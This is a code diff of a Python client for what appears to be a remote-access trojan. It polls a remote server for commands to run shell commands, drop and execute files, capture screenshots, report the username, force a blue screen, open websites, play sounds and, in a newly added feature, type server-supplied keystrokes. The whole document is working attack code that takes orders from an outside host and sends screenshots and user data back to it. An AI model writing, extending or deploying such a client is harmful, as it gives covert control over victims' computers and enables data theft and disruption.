@@ -1,9 +1,8 @@
 from requests import RequestException, Response, post, get
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
+from pyautogui import screenshot, typewrite
 from fleep import get as get_soundtype
-from multiprocessing import Process
-from pyautogui import screenshot
 from playsound import playsound
 from os import remove, getenv
 from threading import Thread
@@ -26,68 +25,73 @@ def main() -> None:
     global connected
     try:
         while True:
-            get_commands_response = get(
+            commands_response = get(
                 f"{SCHEME}://{IP}:{PORT}/command-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_images_response = get(
+            show_image_response = get(
                 f"{SCHEME}://{IP}:{PORT}/image-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_bsod_response = get(
+            bsod_response = get(
                 f"{SCHEME}://{IP}:{PORT}/bsod-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_run_file_response = get(
+            runfile_response = get(
                 f"{SCHEME}://{IP}:{PORT}/runfile-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_screenshot_file_response = get(
+            screenshot_response = get(
                 f"{SCHEME}://{IP}:{PORT}/screenshot-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_website_response = get(
+            open_website_response = get(
                 f"{SCHEME}://{IP}:{PORT}/website-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_drop_file_response = get(
+            dropfile_response = get(
                 f"{SCHEME}://{IP}:{PORT}/dropfile-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_user_response = get(
+            username_response = get(
                 f"{SCHEME}://{IP}:{PORT}/getuser-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            get_playsound_response = get(
+            playsound_response = get(
                 f"{SCHEME}://{IP}:{PORT}/playsound-center",
                 timeout=CONNECT_TIMEOUT,
             )
-            if get_commands_response.status_code == 200:
-                run_command(get_commands_response)
-            if get_images_response.status_code == 200:
-                show_image(get_images_response)
-            if get_bsod_response.status_code == 200:
+            typestring_response = get(
+                f"{SCHEME}://{IP}:{PORT}/typestring-center",
+                timeout=CONNECT_TIMEOUT,
+            )
+
+            if commands_response.status_code == 200:
+                run_command(commands_response)
+            if show_image_response.status_code == 200:
+                show_image(show_image_response)
+            if bsod_response.status_code == 200:
                 invoke_bsod()
-            if get_run_file_response.status_code == 200:
-                run_file(get_run_file_response.json())
-            if get_screenshot_file_response.status_code == 200:
+            if runfile_response.status_code == 200:
+                run_file(runfile_response.json())
+            if screenshot_response.status_code == 200:
                 post_screenshot()
-            if get_website_response.status_code == 200:
-                open_website(get_website_response.text)
-            if get_drop_file_response.status_code == 200:
+            if open_website_response.status_code == 200:
+                open_website(open_website_response.text)
+            if dropfile_response.status_code == 200:
                 drop_file(
-                    get_drop_file_response.json().get("dropfile"),
-                    get_drop_file_response.json().get("location"),
+                    dropfile_response.json().get("dropfile"),
+                    dropfile_response.json().get("location"),
                 )
-            if get_user_response.status_code == 200:
+            if username_response.status_code == 200:
                 post_user()
-            if get_playsound_response.status_code == 200:
-                Process(
-                    target=play_sound, args=[get_playsound_response.content]
-                ).start()
+            if playsound_response.status_code == 200:
+                play_sound(playsound_response.content)
+            if typestring_response.status_code == 200:
+                Thread(target=write_thread, args=[typestring_response.json()])
 
             if not connected:
-                print("Connected.")
+                print("Connected and asked server for actions.")
                 connected = True
             else:
                 print("Asked server for actions.")
@@ -103,6 +107,15 @@ def main() -> None:
     except Exception as error:
         print(error)
         main()
+
+
+def write_thread(response_json: dict) -> None:
+    try:
+        typed_text = response_json.get("text")
+        delay = response_json.get("delay")
+        typewrite(typed_text, delay)
+    except Exception as error:
+        print(error)
 
 
 def play_sound(soundfile_data: bytes) -> None:
